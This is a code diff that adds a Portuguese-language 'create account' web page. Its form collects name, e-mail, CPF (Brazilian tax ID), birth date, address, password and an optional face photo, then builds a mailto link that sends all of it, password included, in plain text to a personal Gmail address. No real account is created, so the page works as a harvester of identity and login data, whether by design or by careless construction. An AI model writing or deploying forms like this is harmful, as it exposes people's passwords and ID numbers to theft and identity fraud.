@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Criar Conta</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            background-color: black;
+            box-sizing: border-box;
+        }
+        h2 {
+            text-align: center;
+            color: #00ff00;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            width: 100%;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #00ff00;
+        }
+        .form-group input[type="text"],
+        .form-group input[type="email"],
+        .form-group input[type="date"],
+        .form-group input[type="file"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .form-group button:hover {
+            background-color: #45a049;
+        }
+        .form-group .terms {
+            display: flex;
+            align-items: center;
+        }
+        .form-group .terms label {
+            font-size: 14px;
+            color: #333;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Criar Conta</h2>
+    <form onsubmit="enviarEmail(); return false;">
+        <div class="form-group">
+            <label for="nome">Nome Completo:</label>
+            <input type="text" id="nome" required>
+        </div>
+        <div class="form-group">
+            <label for="email">E-mail:</label>
+            <input type="email" id="email" required>
+        </div>
+        <div class="form-group">
+            <label for="cpf">CPF:</label>
+            <input type="text" id="cpf" required>
+        </div>
+        <div class="form-group">
+            <label for="dataNascimento">Data de Nascimento:</label>
+            <input type="date" id="dataNascimento" required>
+        </div>
+        <div class="form-group">
+            <label for="endereco">Endereço:</label>
+            <input type="text" id="endereco" required>
+        </div>
+        <div class="form-group">
+            <label for="complemento">Complemento (opcional):</label>
+            <input type="text" id="complemento">
+        </div>
+        <div class="form-group">
+            <label  for="foto">Foto Facial (opcional, mas necessária para recuperação):</label>
+            <input type="file" id="foto" accept="image/*">
+        </div>
+        <div class="form-group">
+            <label for="senha">Senha:</label>
+            <input type="password" id="senha" required>
+        </div>
+        <div class="form-group terms">
+            <input type="checkbox" id="termos" required>
+            <label for="termos">Concordo com os <a href="termo-licença.txt" target="_blank">Termos e Condições</a></label>
+        </div>
+        <div class="form-group">
+            <button type="submit">Enviar</button>
+        </div>
+    </form>
+
+    <script>
+        function enviarEmail() {
+            if (!document.getElementById("termos").checked) {
+                alert("Você deve concordar com os Termos e Condições para criar uma conta.");
+                return;
+            }
+
+            const nome = document.getElementById("nome").value;
+            const email = document.getElementById("email").value;
+            const cpf = document.getElementById("cpf").value;
+            const dataNascimento = document.getElementById("dataNascimento").value;
+            const endereco = document.getElementById("endereco").value;
+            const complemento = document.getElementById("complemento").value || "N/A";
+            const senha = document.getElementById("senha").value;
+            const fotoInput = document.getElementById("foto");
+
+            let foto = "Não foi enviada uma foto.";
+            if (fotoInput.files.length > 0) {
+                const fotoFile = fotoInput.files[0];
+                foto = `Foto Facial: ${fotoFile.name}`;
+            }
+
+            const assunto = `Nova Conta Criada por ${nome}`;
+            const corpo = `
+                Nome Completo: ${nome}
+                E-mail: ${email}
+                CPF: ${cpf}
+                Data de Nascimento: ${dataNascimento}
+                Endereço: ${endereco}
+                Complemento: ${complemento}
+                Senha: ${senha}
+                ${foto}
+            `;
+
+            window.location.href = `mailto:rfpds16@gmail.com?subject=${encodeURIComponent(assunto)}&body=${encodeURIComponent(corpo)}`;
+        }
+    </script>
+</body>
+</html>
